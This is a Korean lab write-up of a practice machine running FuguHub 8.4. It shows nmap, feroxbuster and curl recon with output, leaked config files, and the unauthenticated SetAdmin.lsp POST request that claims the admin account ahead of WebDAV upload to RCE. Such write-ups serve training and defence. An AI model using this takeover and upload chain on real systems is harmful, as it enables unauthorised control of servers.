---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/auth-bypass
  - tech/web/webdav
  - tech/web/file-upload
  - tech/enum/dirbust
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.25
ports: [22, 80, 8082, 9999]
services: [http, ssh, ssl/abyss]
cves: [CVE-2023-24078]
status: solved
manual_tags: true
manual_cves: true
manual_domain: true
tech_count: 5
---
> [!info] PG Practice — Pentester Foundations #2
> **타겟** 192.168.248.25 · **OS** Debian 11 · **난이도** Fundamental · **플래그 1개**
> **경로 요약** 8082 FuguHub 8.4 설정마법사 미완료 → 비인증 관리자 계정 선점 → WebDAV로 `.lsp` 업로드 → `ba.exec()` → **곧바로 root**

## 0. 이 박스에서 배우는 것

1. **"설정 마법사 미완료" = 관리자 계정 선점 가능.** 어플라이언스·자체호스팅 제품 전반에 반복되는 초기화 상태 결함이다.
2. **WebDAV 공유 루트와 웹 루트가 같으면 업로드가 곧 RCE.** `PUT` 한 번으로 서버측 스크립트가 심긴다.
3. **샌드박스는 `pcall`로 관측한다.** `io.popen`이 죽었을 때 무엇이 살아 있는지 목록으로 뽑아내는 절차.
4. **버전 판정의 인식론** — 근거가 셋인데 셋 다 틀릴 수 있다. 세어야 할 것은 개수가 아니라 독립성이다.
5. **서비스가 `User=root`로 돌면 권한상승 단계가 통째로 없다.** 셸 잡자마자 `id`를 치는 이유.

**시험 출제 가능성** — 높다. 단 "FuguHub가 나온다"는 뜻이 아니라 유형이 나온다는 뜻이다. 초기 설정이 안 끝난 어플라이언스(라우터 관리 페이지, NAS 셋업, GitLab/Jenkins 초기 admin 등록, ERP 설치 마법사)는 OSCP·PG에 반복 등장하고, 업로드 → 서버측 스크립트 실행은 확장자만 `.php`/`.jsp`/`.aspx`/`.lsp`로 바뀔 뿐 구조가 같다. 그리고 버전을 오판해 시간을 태우는 함정 — 이게 이 박스가 주는 최대 자산이다.

반대로 CVE 번호 암기는 거의 쓸모가 없다. 이 박스만 해도 랩 브리핑은 8.1, 실행 중인 것은 8.4로 갈렸는데 악용 절차는 그대로였고, 나중에 이 노트가 붙였던 CVE 번호(`CVE-2024-27697`)마저 틀린 것으로 판명났다(1장 참조). 번호를 두 번 틀리는 동안에도 체인은 계속 통했다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.25
Nmap scan report for 192.168.248.25
Host is up (0.093s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
8082/tcp open  http       Barracuda Embedded Web Server
| http-methods:
|_  Potentially risky methods: PROPFIND PATCH PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
|_http-server-header: BarracudaServer.com (Posix)
|_http-title: Home
| http-webdav-scan:
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPPATCH, LOCK, UNLOCK
|   Server Type: BarracudaServer.com (Posix)
|_  WebDAV type: Unknown
9999/tcp open  ssl/abyss?
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
OS details: Linux 5.0 - 5.14
Nmap done at Wed Aug 19 17:09:20 2026 -- 1 IP address (1 host up) scanned in 165.88 seconds
```

*(위는 `nmap.log` 발췌다 — 선두의 `# Nmap ... initiated` 명령줄, `|_ssl-date`, `http-webdav-scan`의 `Server Date:`, `Device type`/`Running:`/`Network Distance`, `TRACEROUTE` 블록, `# Nmap done`의 `#` 접두가 생략표시 없이 잘려 있었다. 값 자체는 원문과 일치한다.)*

읽는 법:

- **8082 = FuguHub 본체.** `Server: BarracudaServer.com` 배너와 SSL 인증서 CN `FuguHub`가 제품을 확정한다.
- **9999 = 같은 앱의 HTTPS 리스너.** `curl -k https://T:9999/`가 8082와 동일한 Home을 반환한다. `bdd.conf`의 `port=8082 / sslport=9999`가 확증.
- `http-methods`에 `PUT`·`MKCOL`·`MOVE`가 있다. WebDAV가 살아 있다는 신호이고 업로드 RCE를 의심할 근거다.
- 80은 nginx 403이지만 버리면 안 된다(아래 참조).

nmap이 9999를 `ssl/abyss?`라고 쓴 것은 오인이 아니다. `abyss`는 `/usr/share/nmap/nmap-services`에 `abyss 9999/tcp 0.004441`로 등재된 9999/tcp의 표준 서비스 이름(Abyss Web Server 관리 인터페이스)이고, nmap은 지문이 안 맞으면 포트 번호 기반의 기본 라벨을 붙인다. 꼬리의 `?`가 "버전 지문 미확정" 표시다. **`서비스명?`의 `?`를 봤으면 nmap이 추측만 했다는 뜻**이니 서비스명을 사실로 받지 말고 직접 붙어서 확인한다. `?`가 없으면 지문이 실제로 매칭된 것이다.

플래그 조합은 `nnmap` 별칭 그대로다. `-sCV`가 이 스캔의 값어치를 만든다 — `http-methods`·`http-webdav-scan`·`ssl-cert`가 전부 NSE 산출물이라 빼면 WebDAV도 CN=FuguHub도 못 본다. `-Pn`은 랩 방화벽이 ICMP를 막을 때 "Host seems down"으로 스캔이 중단되는 것을 막고, `--min-rate 5000`이 `-p-` 전수 스캔을 수십 분에서 165초로 줄인다. `-A`는 정보량이 늘지만 느려서, 급하면 `-p-`로 포트만 뽑고 열린 포트에만 `-sCV`를 다시 거는 2단계가 빠르다. `-p-` 자체는 이 박스에서 없어도 됐다 — 8082(`blackice-alerts`)와 9999(`abyss`)는 둘 다 `nmap-services`에 등재돼 top-1000 안이다(아래 실측). `-p-`의 가치는 [[Hawat]]의 50080처럼 등재되지 않은 고번호에서 나온다.

`ssl-cert`의 CN·SAN은 제품 식별에 강한 단서다. `DNS:FuguHub.local`처럼 내부 도메인이 새기도 한다 — `/etc/hosts`에 등록해두면 vhost 기반 라우팅을 놓치지 않는다.

> [!warning] 정정 — `-p-`가 이 박스를 살렸다는 서술은 같은 세션의 자기 로그가 반증한다
> 이 노트는 원래 *"8082·9999가 기본 1000포트 밖이다. 빼면 이 박스는 22/80만 보이고 시작조차 못 한다"* 라고 적어놨었다. 틀렸다.
>
> 같은 세션에서 돌린 빠른 스캔(`~/PG/Hub/nmap_quick.log`)이 그대로 반박한다:
>
> ```
> # nmap -sS -Pn --top-ports 1000 --min-rate 5000 -oN nmap_quick.log 192.168.248.25
> 22/tcp   open  ssh
> 80/tcp   open  http
> 8082/tcp open  blackice-alerts
> 9999/tcp open  abyss
> ```
>
> `/usr/share/nmap/nmap-services`를 열면 이유가 나온다. `--top-ports N`은 이 파일의 개방 빈도(3열)로 상위 N개를 고른다:
>
> ```
> blackice-alerts	8082/tcp	0.000878
> abyss       	9999/tcp	0.004441
> ```
>
> 둘 다 등재돼 있고 빈도도 낮지 않다. top-1000 안이다.
>
> 그렇다고 `-p-`를 쓰지 말라는 뜻은 아니다. 습관 자체는 옳고 틀린 것은 근거다. `-p-`가 실제로 결정적인 경우는 `nmap-services`에 없거나 빈도가 극히 낮은 고번호 포트고, [[Hawat]]의 50080이 그 예다. 이 박스에서 `-p-`가 준 실익은 65535 전수를 확인해 "더는 없다"를 확정한 것 — 발견이 아니라 배제다.
>
> 이게 이 노트에서 가장 비싼 종류의 오류다. 좋은 습관을 가르치려고 틀린 근거를 댔고, 그 근거를 믿은 독자는 다른 박스에서 top-1000을 과소평가하게 된다. "빠른 스캔은 의미 없다"며 매번 `-p-` 완료를 기다리다 시간을 태우는 식이다. [[_WRITEUP-STANDARD#단정형 일반 지식은 반드시 때려보고 넣는다|표준의 「단정형 일반 지식」 절]]이 이 사례를 인용하고 있다. **일반화의 근거는 "이 박스의 관측"이 아니라 "별도 확인"이어야 한다** — 여기서는 `grep 8082 /usr/share/nmap/nmap-services` 한 줄이면 끝났다.

### 서비스 식별 — 버전 판정

> [!danger] `readme.txt`를 믿으면 틀린다
> 80/tcp nginx가 FuguHub 설치 디렉터리(`/var/www/html`)를 그대로 서빙해서 `readme.txt`를 읽을 수 있다. 그 선두는 이렇게 시작한다:
>
> ```
>  Changes for 8.0     July 2019
> ```
>
> SSL 인증서 `Not valid before: 2019-07-16`, 8082 인덱스 `Last-Modified: 2019-07-19`까지 3중으로 "2019년 8.0"을 가리킨다. **전부 오답이다.** 실행 중인 제품은 8.4고, 배포본에 딸려온 changelog가 갱신되지 않았을 뿐이다.

인증 후 `/rtl/about.lsp`가 앱 스스로 렌더한 값이 최종 근거다:

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s -u admin:password http://192.168.248.25:8082/rtl/about.lsp | grep -i fuguhub
<h2>FuguHub 8.4</h2>
<p>FuguHub is free to use for non-commercial or educational use...
```

버전 증거에는 신뢰 순위가 있다. 앱이 런타임에 렌더하는 About/버전 페이지가 최상위고, 그다음이 서버 헤더나 API가 반환하는 버전 필드([[Crane]]의 `get_server_info`가 이 예), 그다음이 패키지 메타데이터(`composer.json` 등), 맨 아래가 정적 파일의 changelog·readme다. 마지막 것은 갱신 안 된 잔존물일 수 있다. 리소스 해시(favicon, 로고)도 여기서는 무용지물이었다 — 8.0과 8.4가 바이트 동일이라 구분이 안 된다.

랩 브리핑은 이 박스를 **8.1 / CVE-2023-24078**이라고 안내하는데 실제 실행 버전은 8.4다. 다만 **악용 메커니즘은 동일**했다 — `/Config-Wizard/wizard/SetAdmin.lsp` 무인증 노출 → 관리자 선점 → WebDAV `.lsp` 업로드 → RCE.

정정해둘 것이 있다. 이 노트는 원래 *"이 체인은 8.1의 CVE-2023-24078(EDB 51550)과 8.4의 CVE-2024-27697이 공유하는 결함이다"* 라고 단정했는데, 두 CVE는 같은 결함을 공유하지 않는다. 별개 취약점이다.

CVE-2023-24078은 NVD 설명이 *"Real Time Logic FuguHub v8.1 and earlier … remote code execution (RCE) vulnerability via the component /FuguHub/cmsdocs/"* 라고 컴포넌트를 명시하는 파일 업로드/WebDAV 계열이고(CVSS 3.1 8.8 HIGH, CWE-94), 이 노트가 실제로 탄 경로가 이쪽이다. CVE-2024-27697은 FuguHub 8.4에서 관리자 패널 About 페이지(`customize.lsp`)가 편집 가능한 Lua 페이지라는 점을 악용해 Lua 리버스셸을 주입하는 별개 취약점이다 `[가정 — NVD 미공개(`totalResults: 0`)이며 공개 PoC 설명 기준]`. 그 PoC조차 *"계정 생성/인증에는 CVE-2023-24078을 leverage 하고 그 다음 `customize.lsp`"* 라고 두 CVE를 구분해서 쓴다.

그러니 이 노트가 실제로 탄 것은 CVE-2023-24078 계열 — 무인증 관리자 선점 + WebDAV 업로드 RCE다. `customize.lsp`는 건드린 적이 없다. 프론트매터 `cves:`에서도 `CVE-2024-27697`을 제거했다.

6장 ②는 "랩 브리핑의 CVE 번호가 틀렸다"고 지적하는 장인데, 그 지적이 제시한 대체 번호가 또 틀렸다. "실행 버전이 8.4니까 8.4용 CVE가 맞겠지"라는 추론이 그럴듯했기 때문이다. **버전 인접성은 취약점 동일성의 근거가 아니다.** 확인 비용은 30초 — NVD 상세 페이지의 description 한 문장을 읽어 어느 컴포넌트인지 보고, 그것이 내가 탄 경로와 같은지만 확인하면 된다. 남의 CVE 번호를 의심할 때는 자기 번호에도 같은 잣대를 대야 한다.

CVE 번호를 맞히는 것보다 메커니즘을 아는 것이 실전에서 중요하다는 증거가 이 박스다. 번호를 두 번 틀리는 동안에도 체인은 그대로 통했다.

버전 판정이 왜 3중으로 틀렸는지, 그리고 그것을 사전에 막는 절차는 [2-6](#2-6-버전-판정의-인식론--근거의-개수가-아니라-독립성)에서 따로 다룬다. 이 박스의 최대 학습 자산이다.

### 무인증 접근 표면

| 경로 | 코드 | 비고 |
|---|---|---|
| `/` | 200 | "Configuration Wizard must be completed" 배너 |
| `/Config-Wizard/` | 302 → `SetAdmin.lsp` | 무인증 |
| `/Config-Wizard/wizard/SetAdmin.lsp` | 200 | **무인증 — 진입점** |
| `/blog/`, `/photos.html`, `/Contact-Us.html` | 200 | CMS 공개 페이지 |
| `/rtl/about.lsp` | 401 → 인증 후 200 | 버전 확인. 무인증 표면이 아니다 — 아래 참조 `[가정]` |
| `/rtl/protected/*` | 401 | realm `FuguHub` |
| `/fs/` | 401 | realm `Web File Server` (WebDAV) |
| `/private/`, `/private/manage/` | 401 | realm `Content Management System` |

> [!warning] 정정 — `/rtl/about.lsp`는 원래 이 표에 무인증 200으로 적혀 있었다
> 그런데 이 노트의 나머지 네 곳이 모두 "인증이 필요했다"를 전제한다:
> - 1장 버전 판정: *"인증 후 `/rtl/about.lsp`가 앱 스스로 렌더한 값이 최종 근거다"* + 실제 명령이 `curl -s -u admin:password ...`
> - 6장 ① 진행 순서도: *"인증 확보 후 /rtl/about.lsp → FuguHub 8.4"*
> - 6장 ① 교훈 / 2-6 표: *"자격증명을 확보한 직후 가장 먼저 할 일이 About 페이지 확인"*
>
> 무인증 200이 맞다면 이 노트 최대 학습 자산인 2-6장의 교훈이 무너진다. 버전을 30분 헤맨 것이 "인증이 없어서 못 봤다"가 아니라 "열려 있는 페이지를 안 열어봤다"가 되고, 그건 인식론 문제가 아니라 단순 열거 누락이기 때문이다.
>
> 다수 근거를 따라 표를 `401 → 인증 후 200`으로 정정했다. 다만 타겟이 정지돼 재확인이 불가하므로 `[가정]`으로 둔다. 이 박스를 다시 리버트할 기회가 있으면 가장 먼저 확인할 한 줄이 이것이다:
> ```bash
> curl -s -o /dev/null -w "%{http_code}\n" http://TARGET:8082/rtl/about.lsp
> ```
> **표와 서술이 어긋나면 그중 하나는 반드시 틀렸다.** 표는 나중에 요약하면서 쓰기 때문에 특히 잘 어긋나니, 표를 먼저 의심하는 편이 맞다.

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -i -X OPTIONS http://192.168.248.25:8082/
HTTP/1.1 200 OK
Server: BarracudaServer.com (Posix)
Allow: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
DAV: 1, 2
MS-Author-Via: DAV
```

401 응답의 realm 문자열도 그냥 지나치면 안 된다.

```bash
curl -sI http://TARGET:PORT/path | grep -i www-authenticate
```

뽑아보면 `WWW-Authenticate: Basic realm="..."` 의 값이 `FuguHub` · `Web File Server` · `Content Management System` 셋으로 갈린다. 서버가 디렉터리별로 별도의 인증 구성을 붙였다는 뜻이다. BarracudaServer는 아파치식 `.htaccess`류 파일로 디렉터리 단위 realm을 정의한다 `[가정 — 실측한 것은 realm 문자열이 셋으로 갈렸다는 사실뿐이다]`.

여기서 두 가지가 나온다. 하나는 **realm 목록이 곧 "인증이 붙은 디렉터리 목록"**이라는 것 — 그 목록에 없는 경로가 무인증 표면이고, 위 표에서 `/Config-Wizard/`가 그렇게 튀어나왔다. 다른 하나는 하나의 자격증명이 모든 realm에 통한다는 보장이 없다는 것이다. 여기서는 `admin:password`가 세 realm 전부에 통했지만 갈리는 제품도 있으니, 401이 계속 나오면 비밀번호가 틀렸다고 보기 전에 realm이 다른 것부터 의심한다.

### 80/tcp — 403이라고 넘기면 안 되는 이유

루트 인덱스는 403이지만 **문서 루트가 `/var/www/html`, 즉 FuguHub 설치 디렉터리 그 자체**다. 파일명을 직접 때리면 읽힌다.

feroxbuster가 실제로 뱉은 것(`~/PG/Hub/ferox_80.log` 전량):

```
403      GET   7l    9w   153c  http://192.168.248.25/
403      GET   7l    9w   153c  http://192.168.248.25/cache
403      GET   7l    9w   153c  http://192.168.248.25/trace
301      GET   7l   11w   169c  http://192.168.248.25/data        => /data/
301      GET   7l   11w   169c  http://192.168.248.25/themes      => /themes/
301      GET   7l   11w   169c  http://192.168.248.25/applications => /applications/
301      GET   7l   11w   169c  http://192.168.248.25/disk        => /disk/
200      GET   2l    8w    87c  http://192.168.248.25/LICENSE.txt
200      GET 572l 2423w 18730c  http://192.168.248.25/readme.txt   ← (함정) 8.0 changelog
```

이 노트는 원래 이 결과를 *"`/applications/ /data/ /disk/ /themes/ /cache/ /trace/` 403 (autoindex 꺼짐)"* 이라고 한 줄로 뭉뚱그려놨었다. 로그가 반박한다 — 여섯 중 넷은 403이 아니라 301이다. 403은 `/`·`/cache`·`/trace` 셋뿐이고(153바이트 nginx 기본 에러 페이지), `/data`·`/themes`·`/applications`·`/disk`는 169바이트짜리 후행 슬래시 리다이렉트다. nginx가 디렉터리를 인식하고 `/path` → `/path/`로 보낸 것이다.

차이가 실전에서 중요하다. 301은 그 디렉터리가 실재한다는 확정이고(nginx는 존재하지 않는 경로에 301을 주지 않는다), 403은 그다음 단계 — 존재하고 인덱싱만 막혔다는 뜻이다. `/data`·`/disk`·`/applications`는 이미 "실재하는 디렉터리"로 확정된 상태였고 그 안의 파일명을 노려야 할 곳이었다. "전부 403"으로 뭉뚱그리면 이 신호가 사라진다. **스캔 결과를 요약할 때 상태코드를 합치지 마라** — 301/403/401/200은 각각 다른 다음 수를 지시한다.

아래 파일들은 실제로 80에서 내려받았고(로컬에 보존돼 있다) 이 박스의 정보 유출 본체다. 다만 위 스캔이 찾아준 것은 아니다(⑤ 참조):

```
/bdd.conf                        200     56 바이트   ← 설치 경로·포트
/user.dat                        200    467 바이트   ← FuguHub 사용자 DB
/applications/Config-Wizard.zip  200  71872 바이트   ← 설정 마법사 소스 [가정 — 산출물 미보존]
```

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ curl -s http://192.168.248.25/bdd.conf
drivedir="/var/www/html/cmsdocs"
port=8082
sslport=9999
```

`user.dat`(467바이트)은 바이너리가 아니라 한 줄짜리 JSON이다:

```json
{"v":"FNW5DJWHcKEa0LlHmUZiKyeLWdU432yDav00yzU9qamEHEAdK6OZ38rlCHbefsuXVAsIzhTRH90h8WM2CUoZdx\/ZiDYVNVHDu0u4vyv5bT9UDPr6zdOIIdS3sjpdpBclyWo+…"}
```

키 하나(`v`)에 base64 덩어리 하나가 들어 있다. 풀어보면 알려진 해시 접두사(`$1$`·`$6$`·`$apr1$`)가 없는 불투명 blob이라 크랙 대상이 아니다(상세 판정 절차는 6장 ⑥). 그래도 설치 경로를 확정해주고, 셸을 잡은 뒤 드롭한 파일을 80으로 회수하는 통로로 쓸 수 있다.

`403 Forbidden`을 "볼 것 없음"으로 읽으면 안 된다는 것이 여기서 나온다. 디렉터리 인덱싱만 꺼져 있고 파일 자체는 서빙되는 경우가 흔하니 파일명 워드리스트로 다시 긁어야 한다. 여기서는 `-x txt,conf,dat,zip` 계열 확장자가 결정적이었다.

> [!warning] 확장자 화이트리스트가 좁으면 설정 파일이 통째로 안 보인다 — 그런데 이 박스는 그 이야기가 아니었다
> 아래 feroxbuster는 `-x php,txt,html,lsp`로 돌렸고 이 목록에 `conf`·`dat`이 없다. 그래서 `bdd.conf`·`user.dat`이 그 스캔 결과에 없는 것은 사실이다.
>
> 그런데 확장자를 넓힌 2차 스캔도 못 찾았다. `~/PG/Hub/ferox_80_files.log`를 열면 실제로 `-x conf,dat,zip,log,bak,txt`로 돌렸는데 결과가 세 줄뿐이다:
> ```
> 403  /            200  /LICENSE.txt (87c)      200  /readme.txt (18730c)
> ```
> 진짜 원인은 확장자가 아니라 워드리스트다. `raft-medium-files.txt`에는 `bdd`도 `user.dat`도 들어 있지 않다(전수 grep 0건). **기저 단어가 없으면 확장자를 아무리 붙여도 요청 자체가 만들어지지 않는다.**
>
> 그래서 브루트포스의 실패는 두 축으로 갈라서 봐야 한다. 확장자가 부족하면 파일명은 워드리스트에 있는데 못 찾는다(`config`는 있는데 `config.conf`를 안 던진 경우) — `-x`를 넓히면 풀린다. 워드리스트가 부족하면 파일명 자체가 목록에 없고(`bdd`·`user.dat`), 이쪽은 `-x`를 아무리 늘려도 안 풀린다. 브루트포스로 안 나오는 파일명은 "제품이 무엇을 쓰는지"에서 온다 — 벤더 문서, 배포 아카이브(이 박스는 `/applications/Config-Wizard.zip`이 통째로 받아진다), 설치 가이드, GitHub 소스. 제품이 특정된 순간 브루트포스의 우선순위는 내려가고 제품 지식의 우선순위가 올라간다. [[Crane]] 1장에서 같은 결론에 도달했다.
>
> 아래 2단 확장자 전략은 습관으로는 여전히 옳다(다른 박스에서 실제로 작동한다). 다만 "이 박스에서 그 방법으로 `bdd.conf`를 찾았다"는 인과는 성립하지 않는다 `[가정 — 실제로는 제품 지식이나 `Config-Wizard.zip`에서 왔을 가능성이 높으나 그 과정의 산출물이 남아 있지 않다]`.
>
> 웹 앱 정찰에서 확장자 목록은 언어 확장자와 설정·데이터 확장자 두 묶음으로 나눠 생각한다:
>
> | 묶음 | 확장자 | 노리는 것 |
> |---|---|---|
> | 언어 | `php,asp,aspx,jsp,lsp,py,cgi,pl` | 실행 가능한 엔드포인트 |
> | 설정·데이터 | `conf,cfg,ini,env,json,yml,yaml,xml,dat,db,sql,bak,old,zip,tar.gz,log` | 자격증명·경로·버전 |
>
> `json`이 빠지는 실수가 특히 잦다. `package.json`·`composer.json`·`manifest.json`·`config.json`·`.well-known/*.json`은 버전 판정 2순위 근거(패키지 메타데이터)의 주 서식지다. 이 박스는 그 계층이 애초에 없어서(C 바이너리 제품) 버전 판정이 어려웠던 것이기도 하다.
>
> 정리하면 1차는 좁게 빠르게, 2차는 설정·데이터 확장자로 다시, 그리고 2차도 비면 워드리스트를 의심한다.

### feroxbuster — 9999는 통째로 위양성

```bash
┌──(kali㉿kali)-[~/PG/Hub]
└─$ feroxbuster -u http://192.168.248.25:8082/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,lsp -t 100 -o ferox_8082.log
200      GET      147l      606w     6924c http://192.168.248.25:8082/
200      GET       67l      449w     4973c http://192.168.248.25:8082/Contact-Us.html
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/admin/
401      GET        1l        2w       21c http://192.168.248.25:8082/rtl/protected/wfslinks.lsp
```

`raft-medium-directories.txt`는 `directory-list-2.3-medium`보다 노이즈가 적어 디렉터리 훑기에 좋다(시간이 없으면 `raft-small`부터). `-x`에 `lsp`를 넣은 것이 이 스캔의 핵심이다 — 빼면 이 제품의 실행 가능 엔드포인트를 못 본다. **제품이 확정되면 그 제품의 확장자를 반드시 추가한다.** `-t 100`은 임베디드 웹서버 상대로는 과할 수 있어 응답이 이상해지면 낮추고, `-o`는 시험에서 필수다. 재실행 비용이 크다.

빠진 것은 `-C 302`다. 상태코드 필터를 안 걸어서 9999 스캔이 통째로 쓰레기가 됐다.

> [!warning] BarracudaServer는 존재하지 않는 경로에도 302를 준다
> 9999 스캔에서 `/2009`, `/App_Data`, `/fileadmin`, `/downloader`, `/openx` 등 302가 50건 넘게 나왔는데 전부 가짜다.
> 확인법 — 아무 문자열이나 던져본다:
>
> ```bash
> └─$ curl -s -o /dev/null -w "%{http_code}\n" http://192.168.248.25:9999/nonexistent-abc123
> 302
> ```
>
> 스캔 시작 전에 존재할 리 없는 경로를 한 번 때려 서버의 "없음" 응답이 뭔지 확정하고, 그 코드를 `-C 302`로 거르는 습관을 들일 것.

---

## 2. 취약점 분석

순서대로 여섯 가지를 본다. 초기 설정이 안 끝난 어플라이언스가 구조적으로 관리자 선점에 취약한 이유, `SetAdmin.lsp`에 인증이 없는 것이 실수가 아니라 설계상 필연인 까닭, 페이로드가 왜 `email=...&user=...&password=...` 그 세 필드인지, WebDAV 업로드가 어떤 조건에서 RCE로 승격되는지, Lua 샌드박스에서 살아 있는 API를 어떻게 찾아내는지, 그리고 3중으로 일치한 버전 근거가 왜 전부 틀렸는지.

### 2-1. 배경 지식 — 초기 설정 상태 머신

자체호스팅 제품·어플라이언스는 대부분 아래 상태 머신을 갖는다.

```
[설치 직후]  관리자 없음
     │
     │  누구든 접근 가능한 설치/설정 마법사
     ▼
[설정 중]    관리자 계정 생성 요청 대기        ← 여기가 무인증 창구
     │
     │  POST (email, user, password)
     ▼
[운영]       관리자 존재 → 마법사 폐쇄, 전 경로 인증 요구
```

`[설정 중]` 상태에서는 인증을 요구할 수가 없다. 아직 계정이 하나도 없으니 인증할 대상 자체가 없기 때문이다. 무인증 설정 창구는 버그가 아니라 이 설계의 필연이다.

그러면 정상 제품은 어떻게 방어하나. 진짜 결함은 "무인증 창구가 있다"가 아니라 그 창구가 네트워크에 노출된 채 방치됐다는 쪽이고, 제대로 만든 제품은 아래 중 하나를 쓴다.

| 방어 | 예 |
|---|---|
| 로컬 전용 바인딩 — 설정이 끝날 때까지 `127.0.0.1`에만 리슨 | 여러 DB 설치 마법사 |
| 설치 토큰 — 디스크의 파일(`/var/lib/.../initialAdminPassword`)을 읽어야 진행 | Jenkins |
| 시간 창 — 부팅 후 N분 안에만 설정 허용 | 일부 라우터 |
| 원격 IP 제한 — 콘솔/LAN 인터페이스에서만 | 다수 NAS |

이 박스는 넷 중 아무것도 없다. 8082/9999가 전 인터페이스에 열려 있고 상태는 여전히 `[설정 중]`이라, 네트워크가 닿는 누구든 `[운영]`으로 넘기는 트리거를 당길 수 있다.

> [!tip] 이 유형을 알아보는 신호 — 시험 반사
> 페이지에 아래 문구가 보이면 다른 것 다 제쳐두고 먼저 잡는다.
> - "Configuration Wizard must be completed" / "Setup is not complete"
> - "Create the first admin account" / "Initial setup"
> - "Welcome! Let's get started" 류의 온보딩
> - 로그인 폼이 있는데 비밀번호 재설정·가입 링크가 비정상적으로 열려 있음
>
> 확인은 리다이렉트를 따라가서 어디로 던져지는지 보는 것으로 끝난다:
> ```bash
> curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' http://TARGET:PORT/
> curl -s -i http://TARGET:PORT/ | head -40 | grep -iE 'wizard|setup|install|first|admin'
> ```
> 흔한 설정 경로 후보: `/setup`, `/install`, `/install.php`, `/wizard`, `/Config-Wizard/`, `/admin/setup`, `/initial`, `/onboarding`, `/setup.cgi`.

### 2-2. 왜 취약한가 — `SetAdmin.lsp`의 데이터 흐름

무인증 창구가 열려 있다는 것까지는 확인됐으니, 그 창구가 정확히 무엇을 하는지를 본다.

```
POST /Config-Wizard/wizard/SetAdmin.lsp
     body: email=... & user=... & password=...
       │
       ▼
  [ SetAdmin.lsp ]
       │  ① "관리자가 이미 있는가?" 검사
       │       └─ 검사 대상: /var/www/html/user.dat 파일의 존재
       │  ② 없으면 → 사용자 DB 생성
       ▼
  /var/www/html/user.dat  (FuguHub 자체 암호화 포맷)
       │
       ▼
  이후 모든 realm(FuguHub / Web File Server / CMS)의 인증 주체가 됨
```

취약점의 정체는 **인증 검사가 상태 검사로 대체된 것**이다.

| | 정상 설계 | 이 제품 |
|---|---|---|
| 무엇을 검사하나 | 요청자가 누구인가(인증) | 서버가 어떤 상태인가(파일 존재 여부) |
| 공격자가 통제 가능한가 | 아니오 — 자격증명이 필요 | 예 — 상태를 먼저 바꾸면 된다 |
| 결과 | 관리자만 관리자를 만듦 | 가장 먼저 POST한 사람이 관리자 |

여기에 두 번째 결함이 겹친다. 생성된 계정이 세 realm 전부의 주체가 된다 — "설정 마법사의 관리자"와 "파일 서버의 사용자"가 분리돼 있지 않다. 그래서 계정 하나가 곧바로 WebDAV 쓰기 권한으로 이어지고, 이게 이 박스가 한 방에 끝나는 이유다.

그리고 이 공격은 선착순이다. 상태 머신은 한 방향으로만 가고 `[설정 중]` → `[운영]`으로 넘어가면 되돌릴 수 없다. 관리자 계정이 이미 만들어져 있으면 이 경로는 통째로 죽는다. 실전에서 이 표면을 발견했는데 이미 잠겨 있다면 다른 사람이 먼저 잡았거나 관리자가 설정을 마쳤거나 둘 중 하나다. **정찰을 마저 하고 돌아오는 사이에 사라질 수 있는 유일한 종류의 취약점이니 발견 즉시 잡아야 한다.**

### 2-3. 왜 이 페이로드인가

```
email=admin@hub.local&user=admin&password=password
```

세 필드밖에 없다. `user=admin`은 그대로 HTTP Basic 인증의 사용자명이 된다 — 이후 모든 `-u` 값의 앞부분이 이것이다. 값 자체는 아무거나 되지만 로그에서 눈에 띄지 않으려면 평범한 이름을 쓴다. `password=password`도 자유인데, 정책 검증에 걸리면 400이나 에러가 돌아온다. 짧거나 단순해서 거부되면 대문자·숫자·기호를 섞어 재시도한다. `email=`은 계정 메타데이터라 비어 있으면 폼 검증에 걸릴 수 있고, 형식만 맞으면 무엇이든 통과한다.

> [!warning] 정정 — 위 요청에 쓴 도메인은 인증서에서 나온 값이 아니다. 그냥 지어낸 것이다
> 이 노트는 원래 *"도메인은 `nmap`/인증서에서 얻은 `hub.local`을 쓰면 자연스럽다"* 라고 적어놨었다. 그 문자열은 산출물 어디에도 없다. `~/PG/Hub/nmap.log` 실측:
>
> ```
> Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
> Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
> ```
>
> 인증서 SAN이 실제로 준 것은 `FuguHub`·`FuguHub.local`·`localhost` 셋이다. 위 요청에 쓴 값은 박스 이름에서 유추해 임의로 지은 것이고, 이 필드는 형식 검증만 통과하면 되므로 아무 값이나 무방하다(`a@b.c`로도 된다 — 3장 수동 대안 4줄이 그렇게 쓴다). 이 박스에서 `/etc/hosts`에 등록할 후보로 삼을 만한 값은 `FuguHub.local` 하나뿐이다.
>
